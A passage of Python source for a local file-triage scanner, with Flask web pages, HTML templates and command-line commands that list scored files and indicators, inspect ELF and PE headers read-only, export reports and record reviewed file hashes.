  <div class="sub2">{{ f.format }} &middot; {{ fmt_bytes(f.size) }} &middot; entropy
   {{ f.entropy }} &middot; {{ f.summary or '' }}
   {% if f.owner_package %}&middot; owned by {{ f.owner_package }}{% endif %}</div>
  <div class="mono sub2">SHA-256 {{ f.sha256 or '-' }}</div>
  {% for i in indicators.get(f.id, []) %}
  <div class="ind"><span class="pill" style="background:{{ sev.get(i.severity,'#888') }}">
   {{ i.severity|upper }}</span> <b>{{ i.title }}</b>
   <div class="desc">{{ i.detail }}</div>
   {% if i.evidence %}<pre>{{ i.evidence }}</pre>{% endif %}
   {% if i.benign %}<div class="benign"><b>When this is normal:</b> {{ i.benign }}</div>
   {% endif %}</div>
  {% endfor %}
  <form method="post" action="{{ url_for('do_approve') }}" style="margin-top:8px">
   <input type="hidden" name="sha256" value="{{ f.sha256 }}">
   <input type="hidden" name="path" value="{{ f.path }}">
   <input type="hidden" name="scan" value="{{ scan.id }}">
   <button class="btn tiny" type="submit">Mark as reviewed and expected</button></form>
 </td></tr>
{% endfor %}</table>
{% else %}
<div class="empty"><b>Nothing reached the review threshold</b>
 That is not a clean bill of health. It means none of these checks noticed anything - and
 competent malware is written specifically to produce that result.</div>
{% endif %}
{% endblock %}"""

FILES_TPL = """{% extends 'base.html' %}{% block body %}
<h1>Files</h1>
<div class="sub">{{ rows|length }} of {{ scan.scanned }} file(s) from scan #{{ scan.id }},
 highest attention score first.</div>
<div class="bar"><form method="get" style="display:flex;gap:8px;flex-wrap:wrap">
 <input type="hidden" name="scan" value="{{ scan.id }}">
 <select name="format"><option value="">All formats</option>
  {% for f in formats %}<option value="{{ f }}" {{ 'selected' if f==f_format }}>{{ f }}
  </option>{% endfor %}</select>
 <select name="min"><option value="0">Any score</option>
  {% for n in [5,15,35,60] %}<option value="{{ n }}" {{ 'selected' if n==f_min }}>
   score {{ n }}+</option>{% endfor %}</select>
 <input type="text" name="qq" value="{{ f_q }}" placeholder="path, hash or summary">
 <label class="chk"><input type="checkbox" name="reviewed" value="1"
  {{ 'checked' if f_reviewed }}> include files already reviewed</label>
 <button class="btn" type="submit">Filter</button>
 <a class="btn" href="{{ url_for('page_files') }}?scan={{ scan.id }}">Reset</a>
</form></div>
{% if rows %}
<table><tr><th>Score</th><th>File</th><th>Format</th><th>Size</th><th>Entropy</th>
 <th>Owner</th><th>Indicators</th></tr>
{% for f in rows %}
<tr><td class="num"><b style="color:{{ priority_of(f.score)[1] }}">{{ f.score }}</b></td>
 <td><b>{{ f.path }}</b><div class="sub2">{{ f.summary or '' }}</div>
  <div class="mono sub2">{{ (f.sha256 or '-')[:32] }}&hellip;</div>
  {% if f.approved %}<span class="tag good">reviewed</span>{% endif %}
  {% if f.error %}<span class="tag">{{ f.error[:60] }}</span>{% endif %}</td>
 <td><span class="tag" style="border-color:{{ fmt_colour.get(f.format,'#31363f') }}">
  {{ f.format }}</span></td>
 <td class="num">{{ fmt_bytes(f.size) }}</td>
 <td class="num">{{ f.entropy }}</td>
 <td class="mono">{{ f.owner_package or ('-' if f.owner_status=='ok' else 'not checked') }}</td>
 <td class="num">{% if f.indicator_count %}
  <details><summary>{{ f.indicator_count }}</summary>
   {% for i in indicators.get(f.id, []) %}
   <div class="ind" style="text-align:left"><span class="pill"
    style="background:{{ sev.get(i.severity,'#888') }}">{{ i.severity|upper }}</span>
    <b>{{ i.title }}</b><div class="desc">{{ i.detail }}</div>
    {% if i.evidence %}<pre>{{ i.evidence }}</pre>{% endif %}
    {% if i.benign %}<div class="benign"><b>Normal when:</b> {{ i.benign }}</div>{% endif %}
   </div>{% endfor %}</details>
  {% else %}-{% endif %}</td></tr>
{% endfor %}</table>
{% else %}<div class="empty"><b>Nothing matches this filter</b></div>{% endif %}
{% endblock %}"""

INDICATORS_TPL = """{% extends 'base.html' %}{% block body %}
<h1>Indicators</h1>
<div class="sub">Every indicator raised in scan #{{ scan.id }}, grouped by type. Each says
 what it means and when it is completely normal - on a healthy machine most of these fire
 for ordinary reasons.</div>
<div class="bar"><form method="get" style="display:flex;gap:8px;flex-wrap:wrap">
 <input type="hidden" name="scan" value="{{ scan.id }}">
 <select name="severity"><option value="">All severities</option>
  {% for s in severities %}<option value="{{ s }}" {{ 'selected' if s==f_sev }}>{{ s }}
  </option>{% endfor %}</select>
 <input type="text" name="qq" value="{{ f_q }}" placeholder="indicator or file">
 <button class="btn" type="submit">Filter</button>
 <a class="btn" href="{{ url_for('page_indicators') }}?scan={{ scan.id }}">Reset</a>
</form></div>
{% if groups %}
{% for g in groups %}
<div class="card" style="margin-bottom:12px">
 <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">
  <span class="pill" style="background:{{ sev.get(g.severity,'#888') }}">
   {{ g.severity|upper }}</span>
  <b>{{ g.title }}</b>
  <span class="tag">{{ g.count }} file(s)</span>
  <span class="mono sub2">{{ g.code }}</span></div>
 <div class="desc">{{ g.detail }}</div>
 {% if g.benign %}<div class="benign"><b>When this is normal:</b> {{ g.benign }}</div>{% endif %}
 <details style="margin-top:8px"><summary>files</summary>
  <table style="margin-top:8px"><tr><th>Score</th><th>File</th><th>Evidence</th></tr>
  {% for f in g.files %}<tr>
   <td class="num" style="color:{{ priority_of(f.score)[1] }}">{{ f.score }}</td>
   <td class="mono">{{ f.path }}</td>
   <td class="mono">{{ (f.evidence or '')[:120] }}</td></tr>{% endfor %}</table>
 </details>
</div>
{% endfor %}
{% else %}<div class="empty"><b>No indicators match</b></div>{% endif %}
{% endblock %}"""

ANALYTICS_TPL = """{% extends 'base.html' %}{% block body %}
<h1>Analytics</h1>
<div class="sub">Charts are plain SVG rendered from the SQLite database - no external chart
 library, no network calls.</div>
""" + CONTROLS_TPL + """
{% if scan %}
<div class="charts">{{ pie|safe }}{{ bar_fmt|safe }}</div>
<div class="charts" style="margin-top:16px">{{ bar_ind|safe }}{{ scatter|safe }}</div>
<div class="charts" style="margin-top:16px">{{ bar_dir|safe }}{{ bar_score|safe }}</div>
{% endif %}
<h2>Scan history</h2>
{% if scans %}
<table><tr><th>#</th><th>When</th><th>Paths</th><th>Examined</th><th>Flagged</th>
 <th>Top score</th><th>C</th><th>H</th><th>M</th><th>L</th></tr>
{% for s in scans %}<tr>
 <td class="mono"><a href="{{ url_for('page_overview') }}?scan={{ s.id }}">#{{ s.id }}</a></td>
 <td class="mono">{{ s.ts[:19].replace('T',' ') }}</td>
 <td class="mono">{{ s.paths[:46] }}</td>
 <td class="num">{{ s.scanned }}</td><td class="num">{{ s.files_flagged }}</td>
 <td class="num" style="color:{{ s.colour }}"><b>{{ s.top_score }}</b></td>
 <td class="num" style="color:{{ sev.critical }}">{{ s.critical }}</td>
 <td class="num" style="color:{{ sev.high }}">{{ s.high }}</td>
 <td class="num" style="color:{{ sev.medium }}">{{ s.medium }}</td>
 <td class="num">{{ s.low }}</td></tr>{% endfor %}</table>
{% else %}<div class="empty">No scans yet.</div>{% endif %}
{% endblock %}"""

LOGS_TPL = """{% extends 'base.html' %}{% block body %}
<h1>Logs</h1><div class="sub">Every scan, review decision and export, stored locally in
 {{ dbfile }}.</div>
<div class="bar"><form method="get" style="display:flex;gap:8px;flex-wrap:wrap">
 <select name="level"><option value="">All levels</option>
  {% for l in ['INFO','WARN','ERROR'] %}<option value="{{ l }}" {{ 'selected' if l==f_level }}>
   {{ l }}</option>{% endfor %}</select>
 <select name="limit">{% for n in [50,100,250,500,1000] %}
  <option value="{{ n }}" {{ 'selected' if n==limit }}>last {{ n }}</option>{% endfor %}</select>
 <input type="text" name="qq" value="{{ f_q }}" placeholder="search message">
 <button class="btn" type="submit">Filter</button>
 <a class="btn" href="{{ url_for('page_logs') }}">Reset</a>
</form></div>
<div class="grid">
 <div class="card"><div class="l">Events</div><div class="n">{{ counts.total }}</div></div>
 <div class="card"><div class="l">Errors</div>
  <div class="n" style="color:var(--accent)">{{ counts.ERROR }}</div></div>
 <div class="card"><div class="l">Warnings</div>
  <div class="n" style="color:var(--warn)">{{ counts.WARN }}</div></div>
 <div class="card"><div class="l">Info</div><div class="n">{{ counts.INFO }}</div></div>
</div>
{% if rows %}
<table><tr><th>Time (UTC)</th><th>Level</th><th>Source</th><th>Message</th><th>Scan</th></tr>
{% for e in rows %}<tr><td class="mono">{{ e.ts[:19].replace('T',' ') }}</td>
 <td class="mono lvl-{{ e.level }}"><b>{{ e.level }}</b></td>
 <td class="mono">{{ e.source }}</td><td>{{ e.message }}</td>
 <td class="mono">{{ ('#' ~ e.scan_id) if e.scan_id else '-' }}</td></tr>{% endfor %}</table>
{% else %}<div class="empty"><b>No log entries match</b></div>{% endif %}
{% endblock %}"""

TEMPLATES = {"base.html": BASE_TPL, "empty.html": EMPTY_TPL, "overview.html": OVERVIEW_TPL,
             "files.html": FILES_TPL, "indicators.html": INDICATORS_TPL,
             "analytics.html": ANALYTICS_TPL, "logs.html": LOGS_TPL}

try:
    from flask import (Flask, Response, jsonify, redirect, render_template, request, url_for)
    from jinja2 import ChoiceLoader, DictLoader
    HAVE_FLASK = True
except Exception:  # pragma: no cover
    HAVE_FLASK = False


def build_app():
    if not HAVE_FLASK:
        raise SystemExit("Flask is not installed. Install it with:  pip install flask\n"
                         "(The CLI works without Flask; only the web app needs it.)")
    app = Flask(__name__)
    app.jinja_loader = ChoiceLoader([DictLoader(TEMPLATES), app.jinja_loader])

    def ctx(nav, conn, **kw):
        last = q1("SELECT paths FROM scans ORDER BY id DESC LIMIT 1", (), conn)
        base = {"nav": nav, "page": nav.capitalize(), "sev": SEV_COLOR,
                "severities": SEVERITIES, "ts_pretty": ts_pretty, "fmt_bytes": fmt_bytes,
                "priority_of": priority_of, "fmt_colour": FORMAT_COLOR, "scan": None,
                "default_paths": " ".join(DEFAULT_SCAN_PATHS),
                "last_paths": " ".join(json.loads(last["paths"])) if last else None,
                "error": request.args.get("error"), "flash": request.args.get("flash"),
                "all_scans": q("SELECT id, ts, scanned FROM scans ORDER BY id DESC LIMIT 100",
                               (), conn), "indicators": {}}
        base.update(kw)
        return base

    def pick_scan(conn):
        try:
            sid = int(request.args.get("scan", "") or 0)
        except ValueError:
            sid = 0
        if sid and scan_summary(sid, conn):
            return scan_summary(sid, conn)
        sid = latest_scan_id(conn)
        return scan_summary(sid, conn) if sid else None

    def indicators_for(file_ids, conn):
        out = {}
        if not file_ids:
            return out
        marks = ",".join("?" * len(file_ids))
        for r in q(f"SELECT * FROM indicators WHERE file_id IN ({marks}) "
                   f"ORDER BY CASE severity WHEN 'critical' THEN 0 WHEN 'high' THEN 1 "
                   f"WHEN 'medium' THEN 2 WHEN 'low' THEN 3 ELSE 4 END",
                   tuple(file_ids), conn):
            out.setdefault(r["file_id"], []).append(r)
        return out

    @app.route("/")
    def page_overview():
        conn = connect()
        try:
            scan = pick_scan(conn)
            if not scan:
                return render_template("empty.html", **ctx("overview", conn))
            rows = q("SELECT * FROM files WHERE scan_id=? AND score>=15 AND approved=0 "
                     "ORDER BY score DESC LIMIT 15", (scan["id"],), conn)
            return render_template("overview.html", **ctx(
                "overview", conn, scan=scan, rows=rows,
                gauge=svg_gauge(scan["top_score"] or 0, ""),
                indicators=indicators_for([r["id"] for r in rows], conn)))
        finally:
            conn.close()

    @app.route("/files")
    def page_files():
        conn = connect()
        try:
            scan = pick_scan(conn)
            if not scan:
                return render_template("empty.html", **ctx("files", conn))
            fmt = request.args.get("format", "").strip()
            term = request.args.get("qq", "").strip()
            reviewed = request.args.get("reviewed") == "1"
            try:
                minimum = int(request.args.get("min", 0))
            except ValueError:
                minimum = 0
            sql, args = "SELECT * FROM files WHERE scan_id=?", [scan["id"]]
            if fmt:
                sql += " AND format=?"
                args.append(fmt)
            if minimum:
                sql += " AND score>=?"
                args.append(minimum)
            if not reviewed:
                sql += " AND approved=0"
            if term:
                sql += (" AND (path LIKE ? OR IFNULL(sha256,'') LIKE ? "
                        "OR IFNULL(summary,'') LIKE ?)")
                args += [f"%{term}%"] * 3
            sql += " ORDER BY score DESC, path LIMIT 600"
            rows = q(sql, tuple(args), conn)
            formats = [r["format"] for r in q("SELECT DISTINCT format FROM files "
                                              "WHERE scan_id=? ORDER BY format",
                                              (scan["id"],), conn)]
            return render_template("files.html", **ctx(
                "files", conn, scan=scan, rows=rows, formats=formats, f_format=fmt,
                f_min=minimum, f_q=term, f_reviewed=reviewed,
                indicators=indicators_for([r["id"] for r in rows], conn)))
        finally:
            conn.close()

    @app.route("/indicators")
    def page_indicators():
        conn = connect()
        try:
            scan = pick_scan(conn)
            if not scan:
                return render_template("empty.html", **ctx("indicators", conn))
            sev = request.args.get("severity", "").strip()
            term = request.args.get("qq", "").strip()
            sql = ("SELECT i.*, f.path, f.score FROM indicators i JOIN files f "
                   "ON f.id=i.file_id WHERE i.scan_id=?")
            args = [scan["id"]]
            if sev in SEVERITIES:
                sql += " AND i.severity=?"
                args.append(sev)
            if term:
                sql += " AND (i.title LIKE ? OR i.code LIKE ? OR f.path LIKE ?)"
                args += [f"%{term}%"] * 3
            sql += (" ORDER BY CASE i.severity WHEN 'critical' THEN 0 WHEN 'high' THEN 1 "
                    "WHEN 'medium' THEN 2 WHEN 'low' THEN 3 ELSE 4 END, i.code, f.score DESC")
            grouped = {}
            for r in q(sql, tuple(args), conn):
                g = grouped.setdefault(r["code"], {
                    "code": r["code"], "title": r["title"], "severity": r["severity"],
                    "detail": r["detail"], "benign": r["benign"], "files": [], "count": 0})
                g["count"] += 1
                if len(g["files"]) < 40:
                    g["files"].append({"path": r["path"], "score": r["score"],
                                       "evidence": r["evidence"]})
            order = {s: i for i, s in enumerate(SEVERITIES)}
            groups = sorted(grouped.values(),
                            key=lambda g: (order.get(g["severity"], 9), -g["count"]))
            return render_template("indicators.html", **ctx(
                "indicators", conn, scan=scan, groups=groups, f_sev=sev, f_q=term))
        finally:
            conn.close()

    @app.route("/analytics")
    def page_analytics():
        conn = connect()
        try:
            scan = pick_scan(conn)
            kw = {"scan": scan}
            if scan:
                sid = scan["id"]
                fmts = q("SELECT format, COUNT(*) c FROM files WHERE scan_id=? GROUP BY "
                         "format ORDER BY c DESC", (sid,), conn)
                inds = q("SELECT title, COUNT(*) c FROM indicators WHERE scan_id=? AND "
                         "severity!='info' GROUP BY title ORDER BY c DESC LIMIT 12",
                         (sid,), conn)
                files = q("SELECT path, entropy, score FROM files WHERE scan_id=?",
                          (sid,), conn)
                dirs = {}
                for f in files:
                    d = os.path.dirname(f["path"]) or "/"
                    dirs[d] = dirs.get(d, 0) + 1
                buckets = {"0 (nothing)": 0, "1-14 (low)": 0, "15-34 (look)": 0,
                           "35-59 (soon)": 0, "60+ (urgent)": 0}
                for f in files:
                    sc = f["score"] or 0
                    key = ("0 (nothing)" if sc < 1 else "1-14 (low)" if sc < 15
                           else "15-34 (look)" if sc < 35
                           else "35-59 (soon)" if sc < 60 else "60+ (urgent)")
                    buckets[key] += 1
                kw.update(
                    pie=svg_pie([(s, scan[s] or 0, SEV_COLOR[s]) for s in SEVERITIES]),
                    bar_fmt=svg_bar([(r["format"], r["c"]) for r in fmts],
                                    title="Files by format", colors=FORMAT_COLOR),
                    bar_ind=svg_bar([(r["title"], r["c"]) for r in inds],
                                    title="Most common indicators"),
                    scatter=svg_scatter([{"name": os.path.basename(f["path"]),
                                          "entropy": f["entropy"], "score": f["score"]}
                                         for f in files]),
                    bar_dir=svg_bar(sorted(dirs.items(), key=lambda x: -x[1])[:10],
                                    title="Files by directory", color="#5b8def"),
                    bar_score=svg_bar(list(buckets.items()),
                                      title="Attention score distribution", color="#9775fa"))
            scans = []
            for s in q("SELECT * FROM scans ORDER BY id DESC LIMIT 25", (), conn):
                d = dict(s)
                d["colour"] = priority_of(d["top_score"] or 0)[1]
                scans.append(d)
            kw["scans"] = scans
            return render_template("analytics.html", **ctx("analytics", conn, **kw))
        finally:
            conn.close()

    @app.route("/logs")
    def page_logs():
        conn = connect()
        try:
            level = request.args.get("level", "").strip().upper()
            term = request.args.get("qq", "").strip()
            try:
                limit = clamp(int(request.args.get("limit", 100)), 10, 1000)
            except ValueError:
                limit = 100
            sql, args = "SELECT * FROM audit_log WHERE 1=1", []
            if level in ("INFO", "WARN", "ERROR"):
                sql += " AND level=?"
                args.append(level)
            if term:
                sql += " AND (message LIKE ? OR source LIKE ?)"
                args += [f"%{term}%"] * 2
            sql += " ORDER BY id DESC LIMIT ?"
            args.append(limit)
            counts = {"total": q1("SELECT COUNT(*) c FROM audit_log", (), conn)["c"]}
            for lv in ("INFO", "WARN", "ERROR"):
                counts[lv] = q1("SELECT COUNT(*) c FROM audit_log WHERE level=?",
                                (lv,), conn)["c"]
            return render_template("logs.html", **ctx(
                "logs", conn, rows=q(sql, tuple(args), conn), counts=counts, limit=limit,
                f_level=level, f_q=term, dbfile=os.path.abspath(db_path())))
        finally:
            conn.close()

    @app.post("/scan")
    def do_scan():
        import urllib.parse
        raw = (request.form.get("paths") or "").strip()
        paths = [p for p in raw.split() if p] or DEFAULT_SCAN_PATHS
        try:
            sid = run_scan(paths, quick=request.form.get("quick") == "1",
                           all_files=request.form.get("all_files") == "1",
                           note="from the web UI")
            return redirect(url_for("page_overview") + f"?scan={sid}")
        except Exception as e:
            log_event("ERROR", "scan", str(e))
            return redirect(url_for("page_overview") + "?error="
                            + urllib.parse.quote(str(e)))

    @app.post("/approve")
    def do_approve():
        import urllib.parse
        digest = (request.form.get("sha256") or "").strip()
        if digest:
            approve_hash(digest, path=(request.form.get("path") or "").strip(),
                         note="marked reviewed from the web UI")
        return redirect(url_for("page_overview") + f"?scan={request.form.get('scan', '')}"
                        + "&flash=" + urllib.parse.quote(
                            "Recorded as reviewed. Later scans will score it 0 unless its "
                            "contents change - the hash is what is remembered, not the path."))

    @app.route("/export/<fmt>")
    def export(fmt):
        try:
            sid = int(request.args.get("scan", "") or 0) or None
        except ValueError:
            sid = None
        fmt = fmt.lower()
        stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
        if fmt == "json":
            body, mime = export_json(sid), "application/json"
        elif fmt == "csv":
            body, mime = export_csv(sid), "text/csv"
        elif fmt == "html":
            body, mime = export_html(sid), "text/html"
        else:
            return Response("Unsupported format. Use json, csv or html.", 400,
                            mimetype="text/plain")
        log_event("INFO", "export", f"Exported the report as {fmt.upper()}", sid)
        return Response(body, mimetype=mime, headers={
            "Content-Disposition": f'attachment; filename="suspex-{stamp}.{fmt}"'})

    @app.route("/api/summary")
    def api_summary():
        sid = latest_scan_id()
        if not sid:
            return jsonify({"error": "no scans yet"}), 404
        return jsonify({"tool": APP_NAME, "version": VERSION,
                        "disclaimer": DISCLAIMER_SHORT, "not_antivirus": True,
                        "scores_are_triage_priority_not_verdicts": True,
                        "scan": scan_summary(sid)})

    @app.errorhandler(404)
    def nf(_e):
        return Response("404 - page not found. Valid pages: / /files /indicators "
                        "/analytics /logs", 404, mimetype="text/plain")

    return app


def serve(host: str, port: int, debug: bool = False):
    app = build_app()
    init_db()
    log_event("INFO", "web", f"Web app started on http://{host}:{port} (db={db_path()})")
    print(f"\n  {APP_NAME} v{VERSION} - by {AUTHOR}")
    print(f"  {'-' * 66}")
    print(f"  Web app : http://{'127.0.0.1' if host == '0.0.0.0' else host}:{port}")
    print(f"  Database: {os.path.abspath(db_path())}")
    print(f"  Pages   : /  /files  /indicators  /analytics  /logs")
    if host == "0.0.0.0":
        print("  WARNING : bound to 0.0.0.0 - this UI has no authentication and can scan\n"
              "            any path submitted to it. Use 127.0.0.1.")
    print(f"  {textwrap.fill(DISCLAIMER_SHORT, 66, subsequent_indent='  ')}")
    print(f"  {'-' * 66}\n  Press Ctrl+C to stop.\n")
    app.run(host=host, port=port, debug=debug, use_reloader=False)


# =============================================================================
# SECTION 9 - Command line interface
# =============================================================================

def line(char="-", n=78):
    print(char * n)


def banner():
    print(f"\n{APP_NAME} v{VERSION}  |  {AUTHOR}")
    line()
    print(textwrap.fill(DISCLAIMER_SHORT, 78))
    line()


def _print_indicators(inds, indent="    "):
    order = {s: i for i, s in enumerate(SEVERITIES)}
    for i in sorted(inds, key=lambda x: order.get(
            x.severity if hasattr(x, "severity") else x["severity"], 9)):
        sev = i.severity if hasattr(i, "severity") else i["severity"]
        title = i.title if hasattr(i, "title") else i["title"]
        detail = i.detail if hasattr(i, "detail") else i["detail"]
        ev = i.evidence if hasattr(i, "evidence") else i["evidence"]
        benign = i.benign if hasattr(i, "benign") else i["benign"]
        print(f"\n{indent}[{sev.upper():^8}] {title}")
        for l in textwrap.wrap(detail, 68):
            print(f"{indent}    {l}")
        if ev:
            print(f"{indent}    evidence: {' '.join(str(ev).split())[:200]}")
        if benign:
            for l in textwrap.wrap("normal when: " + benign, 68):
                print(f"{indent}    {l}")


def cmd_scan(a):
    banner()
    paths = a.path or DEFAULT_SCAN_PATHS
    print(f"Scanning: {', '.join(paths)}")
    print(f"Mode: {'quick' if a.quick else 'full'}, "
          f"{'every file' if a.all_files else 'executables only'}, "
          f"{'recursive' if not a.no_recurse else 'top level only'}, "
          f"limit {a.max_files} files\n")
    state = {"last": 0}

    def prog(i, total, path):
        if a.quiet or not total:
            return
        pct = 100 * i // total
        if pct >= state["last"] + 10 or i == total:
            state["last"] = pct
            print(f"  [*] {i}/{total} ({pct}%)", flush=True)

    sid = run_scan(paths, recursive=not a.no_recurse, quick=a.quick,
                   max_files=a.max_files, all_files=a.all_files, note=a.note or "",
                   progress=prog)
    print()
    cmd_show(argparse.Namespace(scan=sid, limit=a.show, min_score=a.min_score))
    return 0


def cmd_show(a):
    sid = a.scan or latest_scan_id()
    if not sid:
        print("No scans yet. Run:  scan --path /tmp")
        return
    s = scan_summary(sid)
    if not s:
        print(f"Scan #{sid} not found.")
        return
    conn = connect()
    try:
        line("=")
        print(f"  SCAN #{s['id']}  {s['hostname']}")
        print(f"  {ts_pretty(s['ts'])}  |  {s['scanned']} file(s) examined in "
              f"{s['duration_ms']} ms")
        print(f"  paths: {s['paths']}")
        line("=")
        top = s["top_score"] or 0
        bars = int(round(top / 5))
        print(f"  [{'#' * bars}{'.' * (20 - bars)}]  highest attention score {top}/100 "
              f"- {priority_of(top)[0]}")
        print(f"  {s['files_flagged']} of {s['scanned']} file(s) at or above the review "
              f"threshold")
        print(f"  critical {s['critical']}   high {s['high']}   medium {s['medium']}   "
              f"low {s['low']}   info {s['info']}")
        if s["dirs_denied"]:
            print(f"  NOTE: {s['dirs_denied']} directory(ies) could not be read - coverage "
                  f"is incomplete")
        if s["hit_limit"]:
            print(f"  NOTE: stopped at the file limit; raise --max-files for a complete scan")
        missing = json.loads(s["missing"] or "[]")
        if missing:
            print(f"  NOTE: path(s) not found: {', '.join(missing)}")
        line()
        rows = q("SELECT * FROM files WHERE scan_id=? AND score>=? AND approved=0 "
                 "ORDER BY score DESC LIMIT ?", (sid, a.min_score, a.limit), conn)
        if not rows:
            print("  Nothing reached the review threshold.")
            print()
            print(textwrap.fill(
                "That is not a clean bill of health. It means none of these checks noticed "
                "anything, and competent malware is written specifically to produce that "
                "result. Treat it as 'nothing obvious', not 'safe'.", 74, initial_indent="  ",
                subsequent_indent="  "))
            line()
            return
        print(f"  FILES WORTH REVIEWING (showing {len(rows)})")
        for f in rows:
            print()
            line("-")
            print(f"  {f['score']:>5}  {priority_of(f['score'])[0].upper():<20} {f['path']}")
            print(f"         {f['format']}, {fmt_bytes(f['size'])}, entropy {f['entropy']}"
                  + (f", {f['summary']}" if f["summary"] else ""))
            print(f"         SHA-256 {f['sha256']}")
            if f["owner_package"]:
                print(f"         owned by package: {f['owner_package']}")
            inds = q("SELECT * FROM indicators WHERE file_id=?", (f["id"],), conn)
            _print_indicators([dict(i) for i in inds], indent="         ")
        line()
        print("  Scores order what to read first. They are NOT verdicts.")
        print("  Do not delete anything: note the hash, verify it yourself, follow your")
        print("  incident process. This tool uploads nothing.")
        line()
    finally:
        conn.close()


def cmd_inspect(a):
    banner()
    if not os.path.exists(a.path):
        print(f"Not found: {a.path}")
        return 1
    print(f"Inspecting {a.path}  (read-only; nothing is executed)\n")
    res = inspect_file(a.path, quick=a.quick)
    if res["error"]:
        print(f"  could not read: {res['error']}")
        return 1
    ctx = res["context"]
    p = res["parsed"] or {}
    line("=")
    print(f"  {res['path']}")
    print(f"  {res['format']}  {fmt_bytes(ctx.get('size'))}  entropy {res['entropy']}")
    print(f"  SHA-256 {res['sha256']}")
    print(f"  mode {ctx.get('mode')}  uid {ctx.get('uid')}  mtime "
          f"{(ctx.get('mtime') or '-')[:19]}")
    owner = res["owner"] or ("no package owns it" if res["owner_status"] == "ok"
                             else "package ownership not checked")
    print(f"  {owner}")
    line("=")
    if res["format"] == "ELF" and p.get("ok"):
        print(f"  ELF {p.get('bits')}-bit {p.get('endian')}-endian {p.get('type')}, "
              f"{p.get('machine')}")
        print(f"  entry 0x{p.get('entry', 0):x}   interpreter: {p.get('interp') or 'none '
              '(static)'}")
        print(f"  PIE {p.get('pie')}   NX {p.get('nx')}   RELRO {p.get('relro')}   "
              f"stack canary {p.get('canary')}   stripped {p.get('stripped')}")
        if p.get("needed"):
            print(f"  needs: {', '.join(p['needed'][:12])}")
        if p.get("rpath") or p.get("runpath"):
            print(f"  RPATH {p.get('rpath')}  RUNPATH {p.get('runpath')}")
        print(f"\n  {'SECTION':<20} {'SIZE':>10} {'PERM':<6} ENTROPY")
        for sec in p.get("sections", [])[:20]:
            if sec["size"]:
                print(f"  {sec['name'][:19]:<20} {fmt_bytes(sec['size']):>10} "
                      f"{sec['perm']:<6} {sec['entropy']}")
    elif res["format"] == "PE" and p.get("ok"):
        print(f"  PE {p.get('machine')}, {p.get('subsystem')}, "
              f"{'DLL' if p.get('dll') else 'executable'}")
        print(f"  build timestamp {p.get('timestamp') or 'zero/invalid'}   "
              f"ASLR {p.get('aslr')}   DEP {p.get('dep')}   CFG {p.get('cfg')}")
        print(f"  signature present in header: {p.get('signed_directory')} "
              f"(presence only - this tool cannot verify a signature)")
        if p.get("overlay"):
            print(f"  overlay: {fmt_bytes(p['overlay'])} after the last section")
        print(f"\n  {'SECTION':<14} {'VIRTUAL':>10} {'RAW':>10} {'PERM':<6} ENTROPY")
        for sec in p.get("sections", [])[:20]:
            print(f"  {sec['name'][:13]:<14} {fmt_bytes(sec['vsize']):>10} "
                  f"{fmt_bytes(sec['rawsize']):>10} {sec['perm']:<6} {sec['entropy']}")
        if p.get("imports"):
            print(f"\n  IMPORTS ({len(p['imports'])} module(s))")
            for dll, funcs in list(p["imports"].items())[:10]:
                print(f"   {dll}: {', '.join(funcs[:8])}"
                      f"{' ...' if len(funcs) > 8 else ''}")
    st = res.get("strings") or {}
    if st.get("urls") or st.get("ips"):
        print(f"\n  NETWORK STRINGS")
        for u in st.get("urls", [])[:8]:
            print(f"   url {u[:110]}")
        for i in st.get("ips", [])[:8]:
            print(f"   ip  {i}")
    line()
    print(f"  ATTENTION SCORE {res['score']}/100 - {res['priority']}")
    if res["indicators"]:
        _print_indicators(res["indicators"], indent="   ")
    else:
        print("   No indicators were raised.")
    line()
    print("  A score is a triage priority, not a verdict. Do not delete anything on the")
    print("  strength of it.")
    line()
    return 0


def cmd_files(a):
    sid = a.scan or latest_scan_id()
    if not sid:
        print("No scans yet.")
        return
    sql, args = "SELECT * FROM files WHERE scan_id=? AND score>=?", [sid, a.min_score]
    if a.format:
        sql += " AND format=?"
        args.append(a.format)
    if not a.reviewed:
        sql += " AND approved=0"
    if a.search:
        sql += " AND (path LIKE ? OR IFNULL(sha256,'') LIKE ?)"
        args += [f"%{a.search}%"] * 2
    sql += " ORDER BY score DESC, path LIMIT ?"
    args.append(a.limit)
    rows = q(sql, tuple(args))
    if not rows:
        print("No files match that filter.")
        return
    print(f"{'SCORE':>6} {'PRIORITY':<19} {'FORMAT':<9} {'SIZE':>10} {'ENT':>5}  PATH")
    line()
    for f in rows:
        print(f"{f['score']:>6} {f['priority'][:18]:<19} {f['format']:<9} "
              f"{fmt_bytes(f['size']):>10} {f['entropy'] or 0:>5}  {f['path']}")
    print(f"\n{len(rows)} file(s) from scan #{sid}")


def cmd_indicators(a):
    sid = a.scan or latest_scan_id()
    if not sid:
        print("No scans yet.")
        return
    sql = ("SELECT i.code, i.title, i.severity, COUNT(*) c FROM indicators i "
           "WHERE i.scan_id=?")
    args = [sid]
    if a.severity:
        sql += " AND i.severity=?"
        args.append(a.severity)
    sql += " GROUP BY i.code ORDER BY c DESC"
    rows = q(sql, tuple(args))
    if not rows:
        print("No indicators recorded.")
        return
    print(f"{'COUNT':>6} {'SEVERITY':<10} {'CODE':<28} TITLE")
    line()
    for r in rows:
        print(f"{r['c']:>6} {r['severity']:<10} {r['code'][:27]:<28} {r['title'][:36]}")
    print(f"\n{len(rows)} distinct indicator(s) across scan #{sid}")
    print("Use 'files --scan {0}' or the web app to see which files raised each one."
          .format(sid))


def cmd_approve(a):
    if a.sha256:
        approve_hash(a.sha256, label=a.label or "", note=a.note or "")
        print(f"Recorded {a.sha256[:16]}... as reviewed and expected.")
    elif a.file:
        digest, err = sha256_of(a.file)
        if err:
            print(f"Could not hash {a.file}: {err}")
            return 1
        approve_hash(digest, path=a.file, label=a.label or "", note=a.note or "")
        print(f"Recorded {a.file}\n  SHA-256 {digest}\nas reviewed and expected.")
    else:
        print("Specify --file PATH or --sha256 HASH")
        return 1
    print("Later scans score it 0 unless its contents change - the hash is what is")
    print("remembered, not the path.")
    return 0


def cmd_revoke(a):
    n = revoke_hash(a.sha256)
    print(f"Removed {n} entry(ies)." if n else "That hash was not in the reviewed list.")


def cmd_baseline(a):
    rows = q("SELECT * FROM baseline ORDER BY approved_at DESC LIMIT ?", (a.limit,))
    if not rows:
        print("Nothing has been marked as reviewed yet.")
        print("Use:  approve --file /path/to/known-good")
        return
